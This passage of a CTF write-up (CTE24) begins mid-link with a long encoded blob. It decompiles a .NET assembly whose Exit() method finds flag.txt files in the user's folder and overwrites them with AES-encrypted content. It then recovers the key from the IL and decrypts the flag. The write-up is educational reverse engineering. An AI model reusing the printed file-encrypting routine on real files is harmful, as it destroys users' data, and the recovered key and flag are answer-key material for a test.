OGU2ZTZjYzUxZWU5ODMwMzgxYWJkOGY3YTQxNzFkNjE4ZjBmM2U3ZDNlOWY4ZDc3Nzc0MDI3YmFmMTViZDc2OWUzMGUzYmYzOWE2MmRjZWVhMzYzYTc1ZTEzYzJmYmE2OTg3NjIxZjlkOTk1YTdmODhlMjlkNzdhZDkyNGRmMjFhYWE0MWZiM2YzOWY2N2U3ZDhiNDBlM2YzZDNhMjc3Njg5ODgyMmVhMTA1MGZhODAzM2I1MjY4N2NlMTgxMDZjNjFjM2Y1MDc3OTM5YmYyNTRkYzk5MTUwMDE1ZjAyYTcyNjI5Mjc0YmNlM2UyOTE0ZmViYzg1OTNkNDVmMjBkZjg5YWVmNjk2YWRiODdhYjRhYjQ5MTgyOGJlNDlhM2VlY2E2NjQxM2Q2ZGZhYTRmMDlhNTFjODg1YWFjZjRlYjk5ZmEyZDVjYmUwNWVmMjIyNDllZWJlOGNhY2NkYzNjMDIzNDllOGE5NjY0NzA4YjE5NmE0NTk1MTQzZDdhNDgyMDA1MGEwNjc1NTAzN2EzNDNlOWQ2YTFjNjI5YTA3ODNhMWQwNzlmMzc2ZTM0YjdjNzlkZWY0MzYzZGVjNTAyZWJiYzNjZjU2MjU1Y2I3YmViYWRiMjM4ODZhYzJjMjgyZjI1ZmI3OWFjYjE0OTFkMjIzYWQ5NmY0ZmFmZjliOGIxNTc1Njk3MGJlODYyNjUyZmFlY2M5M2I5YTFiMmFiMDc0Njk2NGIzMjUwYTM1MTAyYmZjMTRlYWI2NWIyYmE4Yzk2MGY2YmI1MjQ5NWYwNWU1ZDc5OWNiZWNlZGIwNDNmMDk4NTllMTlmMzg0MTQ3YTAyMjUzOTY5ZmE0MmNkMzc2NTI3MzJkNDYzZGI1NGMyZjM1ZGVjOThkNTIwYjI1ZjM4MWZhZTUxYjQ3MTM2NzAxNDk2MmYwZGU5ZTE3YTZiOGI1M2UyYTg0Y2E0Y2QyYTQ4YjQ3YmRlYzYzNmIyNjAxZDM4ZjUyY2QwZjJiOTAwYzBiMzY4YWE0ZjMwODU5ZWM0ZDgwZWY0ZjAwYjRlYzcyZmEwN2U4NTg2ZGRmMTA4YTFlY2ViY2NlMzUxMWZhNjZmMDQyOWJiMGNhZWUxZTc4OTY3YTk4NzUzYzE2MDQ2MjQ4YzJlNWJhOTIxZjhlZDViYWZkZmQzOGUyMzZjMDBmZGMzMWViNmM4MzI2NzYxZWY3NzkwODg1Yzk3OTgyMjg4NWNlZjAyODVmNmNhYzlkYzM1MDY0YmM1OThiZTE3OTFmOWVlMTBiNTU5YTM4ZWViNDgwMWEyYTZkZDg5ZmNhM2Y0MjBjMDFlYTM3YjE4OWI2YjI4MWRhOTQ0MWRjZjcyNTExZmYzZjk4YTU1NWMwNjY4MmMxMGJkM2M1ZDcxMDYxYWE2M2FmYTQ0ZjQ5NGQ1MjA5NjkzNTIxN2YwNjUxMjQ2NWFkMzI4NWNlYjkzYWU3ZmNjYzU2MTQ5ZWNlN2U3ZTkxZmNjY2Q2OGNiNWE1MTI1ODVkYzFlZWU1MmU5ODNmZmI5Nzg1NDY3NzQ3NGE5YjkwOGIwZWQxZWZiODI3MzFiMDdiNjdkMjA5NTZiODhiNjFmZjJkYmM0MzBmZWUzODlhZTY4NDgwYjBmNWQ0ZjQwMmMxZDgwZDllNmJmZmRiNGEzNTc3Y2IyZTY2MGZhZjg4Njc3NzBmNDVhNjc5M2FiMzg3MTk5NWU1MjdhODJmYTNmOGJkNDdjZWE0MzFmNmJhNDIzMGY0YTM4MGVkMjUyMDI0NTc0ZjA0ZDAxZGIyMWNmNWY0NWU0ODI3MzZmYjlkZmRlZWI0Njc3Y2E0Yjg5YWQxMDMzZWVlZmRkYWQ0MzRhMDFjY2EyM2FjYmJiNmJkZDE3NzlkODEyYjM2ZTA0MDRkODRkZTdjOTQyNzJjNmFiODk5MDY0YmE4NDg2YjQ4NDM3MjZmMGU2OGEzN2M1MjNmMTQ0NjQyYWNmOGM5NGIwN2UzYzBlYjllYmVlNDgxYzFhYzM0OTQzY2UxODQ5OTIwMGVhNjY2ODc5NjkzZWZjMDUyNDYzYmQ1MTZhY2FhODIxYmJkOWJjZjZjN2JhMDdkOTg1NDc0N2EzZDIxYjMwOTE2MDQyZmFjOTZlYWI5YjIwZGI3ZDYzMWI4ZDAwNTQ3MjVjMTIyMTg5YmUwNDJjMWRkMTRiZTc1OWU1MTU1MTI1OGJmYTJjNzg4YzA4YjlhMTFiNWM3YWU3ZDU3NDkzYTU0NmVmNjk5YzY0MzMwNDA5ZGFlMjgxMDVmNjZmZjI4MTQ3N2I5MDJiOWU0M2ZhZGFiMTljYjMwYTYyNGY3ODRkOTAxZGNiNWYzNWQzMDNmZTFiODEwYmMzY2U3OGYzMWIzYmZjMmZlOTc2YWM5YTQzODhkZjNjNzcyZTM4YWE4MTVmYWFhYmY1YTM1NTQ4ODJkYThmOTdmMzVmMjgwMDg0M2VlMTg4YmMzOTY3OTFhNzc5MzE3NWYyY2M4MDE2NDBlN2RiNDM3MjU2YjNjM2IxY2NhNzE5M2M5OTQ3MDYzZDRkMmZjYWQ5Njk5Y2FiM2NlYjUyZjAyNWEwN2Y4MTRhOGFhM2ZjZmRjMTYzZDFkYmIyOGZlNzVjNWIxOTI2YTJlNmM2N2M4MzJjYWI0ZjlhM2FiZDZkNWFhNDAzZTU5OGFkYjUzNmQ0NzkwYThiZGJlNzFkNzMzYWY4NTc2ODM2Njk2MGMxOGY2OTZkOWIzZDhmZjkwYzY0ZDg4M2U0NmQ5MzUyMTViMmUyNDE1YjRmMjRkZGYxNmI4Nzk2YzlhYTk0NWEyZTlkN2Y4MWNkMDIzMzlhYzZlYWQzYTE0ZTU1NTJmNzZjOGY4ODhiMjI3ODEyYzYzMTQ0OTYwODg1MzM4YmUxY2MxZmI5MzhiNWFiYmIzZWRlMWEzZDJjYTkwNzYxNzkzNWU4ZGZkM2MyMmRmYjVjYzJmMDNjNmNhODUxNzBiODdjNjQ0Njk4Y2E5Mjk4MzVlYWE4YmRmNjUzNGQ5ODY5OTYzZjlkZDQ3OWI2NjUxNGM2NGU4MzJjOTRlZGRkOTVmYTU5NzFlN2NlZjBlMWE0Zjc3ODJjZWY3ZmY1OTkzYTYwYzNiYmY0OGFkMTc5OTNjMDU2NTg5NjNlYzMzM2FjZjUzYzRhZjJhZmIzMjBkNzY1YjQ0MTlhNzNlNzk4ZGUwYzJkMWJmOTk1M2UyODVlMjI2YmVmM2ZiNTBlMTQyMjRjMTQ1OGM5ZWZiZGU4YTllNWQ4Yzg2MjQ2Nzk1ZTI4YjBiYjY5NjkzZTk2NGY5M2NjNGI3OTI5ODY5YzkxZTI3NjRlNDc3ZmFiZDZkYWQ3N2Y4MGM5YmI5ZTg1YjM0MzE1YWM3NWMxMzA2ZDI2NTM2OGM4MTdjYzFiOGYyNzJhNDA5OWM3YzFkYWJlZTBiNGFmZjZlMDEwNmY5MDEyNDBlNTI5MjAxODJkYWNjMjI3YzNhYTI4YTg0MDBkNDczNDEzNWZhNDQyMjVhNDM5Yzc1ZTJmOTlkMzQ4MWI2NTUwMDEzMzdiOGExNGQzYzUyOWZmYzZiMDMyMDVmYmIzNmIxMGI5YmQwNTJlYzk0NDI0MjliMWNjODFlNjZkNjcwN2ZmMTRiNWIzZDE4MmFiODY1MGNlMzY3YzhiMzFiYzgzN2UwZmU2ZjUzMzg4MzUxNzAwM2EyOThiOTU1ZWIwMjUxZGI5Y2MyYTQwMDhkY2U2ODM5ZWY1MmQ3ODFmNDIzMDgzNTVkYjliMzA0ODc0YmU0N2E5ODU4YTQwNDIyNWE0NGUxOWY4MDBkZGFhZDgxNjdmNjI0YWQwN2VkYjZjMjRiYzRmYmQ5OTEzMzk0ZmJjYzNmZjY4NDE4ZjI2YTc3OGIyOTQ0MGJmYjk1ZDc4YjM0YmFiOWE4MzdkZDliMTU0NjY1Mjg1MWViZTAyZWRiMDYxZDY2NzU3Y2VmMjFhNDM4ZTAxMzllNjY4ZDZkZjFiZDJjNjQ1NWRhZDYwZTBmZTcyZGU0MWM4YTBmYTI1YjNhNGY4NDkyNmQ3NTE3NWQ3Yzg2YzFlNzMzMDlmYmYzMjNlYThlZDAzMWZlMGY3NmU4NGU0NGNlYTRmODAzMTgwMzJlYzgyMmY2NDMwYTQ5NTM3NjAwYTJkOTE1MjJkOGIxZDNkYjE2Yzg1YzZmM2YxZGMzOThiY2ZlM2JiNzc5M2Y3NTljMWEwYWQ2YzVjMDMzYjRhYWMxOTdkOTA4YjBmYThkODdiNDE3ZDliYTE4ZTBiNjIxMzA5MTlkODhlNjg3YmQ5NzZjMGI0NTZhMTJhMzYwZTNiNDI0ODY5ZDI4OTJjMDM2MWVmMmIzMmViNWZkZmEwOWFkZDYwOGVlZTFiMjZkZTEyMjg2OTJmMzllMzFjOTRhNjNjZDcxZjczZWVhMzk3NzNlZTM2N2NmMDdjZTBkMDMzNWI1MWEwODlhYjdlYjY4Y2YxNmYyYzhiZmQ2MzE0NTQwNWEwMThlNzhiYjY2MWM3YTkyNGUyMDI0YjI1NTZiY2M3NWJlOGQwM2JiMzhjMDYwN2NiMGY0NzBjYTNjYmZhNzIyMzg4MWI1MTZhNzk2YzI0MmFlYzI1ZDMwNDhhMDBlOTRjZDBjYjdmYzE2OGVhMmQ5YTMzM2UwM2ExYTI0M2I3MTNlYjY2YmMxMzcxZWFlNGMyNTkxZjQyNzM4MzFlMTg0ODI1MzIwOGZjN2YwNzc0MDk4MjczNmIzODRiMTY5ZDQxZWI4MmM1NWZjYmM5ZDgxZjhmYmI0YWY5NTVlN2UwMjNhOWY5ZDViNjE2MjNiM2MwNWRkODJmYmE2ZTBlNjA4NmM5YjA0NDE5ZTdlZDE4ODI5ZWVmNDE4YzMyZWViZDEzODMxY2FhNzdhNDQxYTNmMzhlZGMzODYxZGE5MjJmYjM4NmE3YzlhYjBjNDMyZDhjMDZjNzEwMTdiZmM0NjA2NTI0MTY1M2Q4OTgxNDUxMzE1ZDBlZDIxYjViYjA1NjEyZjY1MmFiMTg1YzJiN2Q2ZTUwYzAyNTZjZGRjODQ4ODdmZmRkMDY2MWI4YzQ1NDUxMGViYWJmZmQ4ZWMxYjUxZDFkZDY5ZGNhOWQxYTQwOTBjYzE1NGNmYzU5MzdiNjI3MDAyYTMxYzc5MmYzNzA2NGU3MTc0NDEyNTNlNGEyNDZkMzcwZGIzNjlhYWFmZThjNjc2YjM5NzYzZDk4MmNlNDM5ZWVkZGUzMGExYmEyYjBiM2I2ZDFhMzMzMWI0OTc3MDc4ZGIyOGFiMTc5ZTVjYTRkN2IyZGY4N2ZjMGE3OWUxNjU3YWI5YjQ5ZTEwMWIxZWQzZTk1MmNhMTlhNzFkM2RjYWNkZTlmZDk2ZDg5MTM4ZWI0OTc4YjMzOWFkNmI5ODMxMGMyMTMwNjgzM2RlMDM2MjAzMWNhM2VhYjhiNjg2YTk5YmUzZjliYWE3YjI1MGY1MWNhNzlkMzcyOTE3NjdiNjU1ODYyYWU2OTg5OTI1ZDZmYjg5NzViMDQ5NGQ4NDUzNjdhZWRmN2QwMTBkZWQ0ZmY5NDk1NGM2Njg1NTQ1MGUxMmEyZWE1ZjYzZjQ5NWI5NDQxNDk5MzM1YWVhMDE2NjA5M2NhOTM1ZjliNzE4YTAxYjNlZGYzNzU5MjM4OGYzNDk2YzRhMTdjMzQzM2I3NDU3MTQ2YjM0MjNiYjZlNDllNjlhOTM4M2FlODcwZTc2MGU4OTBjNTkzNDM2ODg0MmIxYWRjNDNkYTU4ZWY1NDI3ZmY2NDNjMTFkODE5ZDMzZDAwYzBiN2JiMmFlMTQ0NzQ0MDRjNGEzYzU1ZWQyMjc4NzEyMDYzNGNhMzIwMTNjYzc2NGIwNzFmOGFhMjMzZWE0MjJmMDRlOWU3ZjFkMDRhYWFlYzIwMDY4NDRiNDNlZTlhOWYxNzlmZTQ0OTllZWQzMjNhMWYwZjk5MzJkZDMwYzkwYWY4ZmJkZDg5ODNkM2NkZjMxOTExNjM5MTVhOGQ2NWVjYzg4YzE3NDdiZjQzZWU2NWI2YzUxYjIyMjdlOThiMGFlNGRhYmU5NTc2OWJlNDA5YTZkNzhmMDVjZmMwNWRkMTllOGQyZGY5NmJmOWZhNmIyNDE5NzJhNWU2NDc1NDlhNjY3MzEzZDRhN2U3Y2M0MTY2M2Q0ZDBkOWM2OWMyOTlmM2IzMGVmNDVhMDM1NGQ1M2UzNWYxMzFmYTE2NWVkNzFkNzRjNzMxNDNmODI5ZjM3ZTJhZmMyNDJiYzIxNDgxMmExZmFmM2YzYmE5ODg5ZTg1MTY5YWNlZjEwNTgwZGM2NzFkNWRlZDgxNDc3M2ExMTg4MGUyMDU4OTg1Yzg4MGVkODFiMGMxMGRiNjc5MjZkYjQxNzBjYTJhYWJmZDM5YmI2ZmNmOGVlZTI2NjJjYmU1YzBlOGM4MDc3NmY1MDE5ZTU0ZjU0YTMxZmQ2OGQ2MGNhNzk2Y2M4ZWExYTBjODJkZTZiYTcxMjJkZjMwMmFkZjkzYjk3ZjAzZjhlODdhYjE2NzczYzI4OTJmNjQ0NDlhNjRmNDI1ODJlZmMxYmRkNGM5YTY0NTE4ZmNjNGJjNjNlNTI4NjJiNWMwODE1OGY1MmRkOGYzNGZhNWVhY2Y1ZTg5OTU5ZTlmZDRjZmU3NzFlZDcxNzE5ZjQxOGU2YmQ5OGJiYzVkYzQ1YzViMDBhNDE2MjVmMGRhYjZjYzBjZjQxN2NmYTI1MzNkMGJhZDJmYTA2YzYyYmIwNmJmZmVlMTNjMWNmNTc1NjAwOWVmMTY3ODIyZjQzODUxOWIwOTdkOGM0MGNmNzY1OWYxMDFlZDJjMjE3YTI5NjViMGU3ODJlMjdlYWRjZTQ2YzM3MWEzODljYzNmNGQxYjg3ZmJlYjc0NDc4YzYxNmMzN2Q3YjNiODI1NThmNmZhNzczOGM0MmY2MzU5Y2VlMTVlZTU3NDc3Nzk4NmJmMmU3OTNiMjg0YjhiOTcyNTU5NDhhNGQxMDRiNDE2ZjJkZWY1ZDc2NmM3MmNlM2YzYmYxYWUwNmM0MjQxOWRiYzU4MTZjMWJlNTNkNGRjN2NlZDAxMWY2ODgzY2UzOTYwMGU0NTRkY2E1NWYyNzI3YWQ1ZmUzOTcxMzBmYzdlMTJjNTcyZDU5YjNlYzNiNDRlODdkZDBkM2YxODlmNzk0NzNkMWNiMjA1NmUwNDYzYmYwYjVmYTY2MjYzYTFlMThmOWM2MjRmMjU3ZjZlYjZlY2QxODYxNzc1NmQxMjc5YjdhYWU3NGZhM2U2ZjZlNzM2ODA1NzhkNDlkMDZmYmZlOTkzZDQ2NzQ3ZmI5NjI1OTgzNmMwYjJhN2JhODAzODMzYTgwZjQ2MWE3OWM5YWU4Njg4MWU4YjA1OWNlYmY5MmZmOTZlZDdhNDZhYmM4ZmI0ZjgyNmRiMGZkM2VkNzVlOWY4YmJjYzdkMTU3YThiNDU2YTc5NGFiY2Y5YTgwN2UxYWQzNDFhNzU3YzNlZmY5MmU5ZDhhM2RhZjY5YmVmOGEyY2VmMWM5MzgyMDU5YzEyMjRiZTcwNmNiYjViMjJiODhkNWM0YmM2YjcyZjA5YTcxYzkzNDg4OGMzOGQ5OTNhYzYyOWI0Y2VlY2Y4ZjU3OTZmY2Y2ZTM0YmI5MTVkYjdhMWVkNWIwY2VjNWRkN2Q5NDY1MzE5ODJiYTAzZjE0MGZlYjQ1ZTkzNzI2ZWMyMmM0OTkzYzA0OGNlZjkxMmUzMjJmMDg0ZTZjODgzNTFmMGQ3YmZkNjllZmJjNzliNzQwOWQ2ZTk0OGFiM2IxZjY1NzYwY2JkN2Y2YTZmNGUwNTQ2YjYxZDYyOTcwMjhkMWE4NGMwMTFmYTBmNDBkYTIwMjcwMDczYjk5ODRmY2Q2OWI5NmU0Y2RiYmY0ODQ1ZjFjNGE2YmZmODdlYmFlNjA5YWZiY2UwYzRhZGVmMGFiM2VkYzI5MGMwNThhYzM3NmRmMDIzOWUzMTQyMmY0M2JiYzNkODJmZmY2YWIwODFmZTc4ZWQxNTZjODJmMWI5N2RiNTljMWYwNGMxY2E4ZDlkZWE0MmE5NzUyNmMzZDJhZDQ0NDM1OWRhMGQ0MmMxMWE2NjE5NWNhNmE2ZDhhZDdjMDk1OGVmODYxNDBkMzI1OGY1MTc3MzVmOTZkMGUxNjg3ODJjZDk0MWE4M2U4NGU4YTA1Nzk2M2VjYzE3OWQ0YzhjYTk3MjRjZjY1OTVmZDJjODZhYTZlYWU4MmYxOWQ4ZGQ2OTJlYjU1MmExZTE2YTQ3MWY1YjAyOWEyMzJiMjllZTU5MTUwZWU0MWY0OGMwMTM3MWM1ODMzOGI0Zjc2Nzc2ZmM2NTNlNjRhYmI0ODYyOWViMzk0YjgzZWIwZTg0MjZmNDFhMmNkNzdiOTRlNWNiODYyMTlhM2FiYzI0YjkyMmViNTUxZTkwM2MxNDA5M2VmZjY4MjRiYjk4MmQ1NDgyZDljYmY3NDdjMDhhMjAzNDRhZjFkMGM3Yzk1ZTdlZmRhN2VmZWI4NTQxMGEyNTdmZGY0NzY1NzhkYjFmOGU5NGMxZTUwMWFlOGUyMGMxODM4ZDljZmIyNmYwYTNkYjIyZjdmMGM3YmE0NDlhYmFiMzMwMmU5ZmQ4NzE1ODdiZTU4MGMzYTRhYzYzZmU1OTU4MDhiNDFjYjc3NTBiNTg1OWJlMWJmNDJjMWVhN2MzZGRhNDdhZTQ1YjIyY2JhOGNlNDUzZWNmNzZjNzJkYjhmYWQzYzFmOWM5ODUwN2VjZWZlYzg4NDk5Y2IxZGMwZGZkZTNhNmRhNGNmNDRiN2MxNWJiNWQ4ODU0MTQzYTljNGY0OTMzYzM2ZjI0ZjA3&oenc=65001), you can directly download the result from there).

**Important**: that exec seems standalone, i.e. does not use any of the "crypto" params that we saw so far.

# Mono Assembly

Grabbing `download.exe` from the CodeChef link, we can't quite execute it:

```
$ mono download.exe 
Assembly '/home/muflon/work/ctf/shc/pwsh/download.exe' doesn't have an entry point.
```

That makes sense, as we already saw that it's being used by calling `Exit()` method, and probably
does not have `main()` on purpose. We can try decompiling it though. Of many tools that I tried,
[ILSpy](https://github.com/icsharpcode/ILSpy) got me closest to a reasonably looking code - even if
still not complete:

```c#
// FlagCryptor.Program
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;

public class Program {
  public static void Exit(int unused)     {
    //IL_0042: Expected O, but got Unknown
    string folderPath = Environment.GetFolderPath((SpecialFolder)40);
    Console.WriteLine("Searching " + folderPath);
    EnumerationOptions val = new EnumerationOptions();
    val.set_IgnoreInaccessible(true);
    val.set_RecurseSubdirectories(true);
    val.set_ReturnSpecialDirectories(false);
    val.set_AttributesToSkip((FileAttributes)70);
    val.set_MatchType((MatchType)0);
    EnumerationOptions val2 = val;
    bool flag = false;
    string[] files = Directory.GetFiles(folderPath, "flag.txt", val2);
    foreach (string text in files) {
      try {
        string text2 = File.ReadAllText(text);
        if (text2.Contains("CTE24{")) {
          Console.WriteLine("Found file to encrypt " + text);
          File.WriteAllText(text, Encrypt(text2));
          flag = true;
        }
      } catch (System.Exception) {}
    }
    if (!flag) {
      Console.WriteLine("No matching file found.");
    }
    Console.WriteLine("Done");
    [CompilerGenerated]
    static string Encrypt(string content) {
      MemoryStream val3 = new MemoryStream();
      try {
        Aes val4 = Aes.Create();
        try {
          byte[] array = new byte[16];
          RuntimeHelpers.InitializeArray((System.Array)array, (RuntimeFieldHandle) /*OpCode not supported: LdMemberToken*/ );
          ((SymmetricAlgorithm)val4).set_Key(array);
          ((Stream)val3).Write(((SymmetricAlgorithm)val4).get_IV(), 0, ((SymmetricAlgorithm)val4).get_IV().Length);
          CryptoStream val5 = new CryptoStream((Stream)(object)val3, ((SymmetricAlgorithm)val4).CreateEncryptor(), (CryptoStreamMode)1);
          try {
            StreamWriter val6 = new StreamWriter((Stream)(object)val5);
            try {
              ((TextWriter)val6).WriteLine(content);
            } finally {
              ((System.IDisposable)val6)?.Dispose();
            }
          } finally {
            ((System.IDisposable)val5)?.Dispose();
          }
        } finally {
          ((System.IDisposable)val4)?.Dispose();
        }
        return Convert.ToHexString(val3.ToArray());
      } finally {
        ((System.IDisposable)val3)?.Dispose();
      }
    }
  }
}
```

With some warnings though:

```
//IL_0018: Unknown result type (might be due to invalid IL or missing references)
//IL_001d: Unknown result type (might be due to invalid IL or missing references)
//IL_0024: Unknown result type (might be due to invalid IL or missing references)
//IL_002b: Unknown result type (might be due to invalid IL or missing references)
//IL_0032: Unknown result type (might be due to invalid IL or missing references)
//IL_003a: Unknown result type (might be due to invalid IL or missing references)
(...)
//IL_0000: Unknown result type (might be due to invalid IL or missing references)
//IL_0006: Expected O, but got Unknown
//IL_0041: Unknown result type (might be due to invalid IL or missing references)
//IL_0047: Expected O, but got Unknown
//IL_0048: Unknown result type (might be due to invalid IL or missing references)
//IL_004e: Expected O, but got Unknown
```

# The final decryption

The key bit of the `Encrypt()` method, with boilerplate / exceptions stripped:
two main parts

```c#
Aes aes = Aes.Create();
byte[] key = new byte[16];
RuntimeHelpers.InitializeArray(key, (RuntimeFieldHandle) /*OpCode not supported: LdMemberToken*/ );
aes.set_Key(key);

MemoryStream memStream = new MemoryStream();
memStream.Write(aes.get_IV(), 0, aes.get_IV().Length);
CryptoStream cStream = new CryptoStream(memStream, aes.CreateEncryptor(), (CryptoStreamMode)1);
StreamWriter sWriter = new StreamWriter(cStream);
sWriter.WriteLine(content);
return Convert.ToHexString(memStream.ToArray());
```

Note that we are missing the data for the `key` array. The decompiler gave up on that.
But that's easy to get with a disassembler:

```
$ ikdasm download.exe
(...)
IL_000c:  ldloc.1
IL_000d:  ldc.i4.s   16
IL_000f:  newarr     [System.Runtime]System.Byte
IL_0014:  dup
IL_0015:  ldtoken    field class '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=16'
                     '<PrivateImplementationDetails>'::'86198F7CAA8D42536A63147278AE2BD003EEA78A804E9544B1E2F1C8DD63CF66'
IL_001a:  call       void [System.Runtime]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(
                     [System.Runtime]System.Array, [System.Runtime]System.RuntimeFieldHandle)
IL_001f:  callvirt   instance void [System.Security.Cryptography]System.Security.Cryptography.SymmetricAlgorithm::set_Key(uint8[])

(...)

.field static assembly initonly class '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=16'
                    '86198F7CAA8D42536A63147278AE2BD003EEA78A804E9544B1E2F1C8DD63CF66' at I_000030A8

(...)

.data cil I_000030A8 = bytearray (84 59 B3 6E 81 9A 95 E5 32 57 00 9D B6 C1 51 83) // .Y.n....2W....Q.
```

(search for `I_000030A8` and `86198F7C` to correlate)


At this point, we:

*   Have the key: `8459B36E819A95E53257009DB6C15183`
*   Know that the first 16 bytes (32 hex digits) of the encrypted file contain the IV: `C27453D6EF9D22C34460D6AB62CE7D87`
*   And that the encrypted contents follows:

    ```
    60F535941E29CF7125B8A2DAB8AD941CC277363F1C0F80BD73BA7963A37F3AA2D7AC4B1979C817E4BCF1E4BD2344AB399CEB3D730F7223A9901312199D7E2727
    ```

[Back to CyberChef we go](https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'8459B36E819A95E53257009DB6C15183'%7D,%7B'option':'Hex','string':'C27453D6EF9D22C34460D6AB62CE7D87'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=NjBGNTM1OTQxRTI5Q0Y3MTI1QjhBMkRBQjhBRDk0MUNDMjc3MzYzRjFDMEY4MEJENzNCQTc5NjNBMzdGM0FBMkQ3QUM0QjE5NzlDODE3RTRCQ0YxRTRCRDIzNDRBQjM5OUNFQjNENzMwRjcyMjNBOTkwMTMxMjE5OUQ3RTI3Mjc) &#128578;

---

## `CTE24{p0w3rsh3ll_4nd_d0tn3t_r3_de79e3dbd0f89a53}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
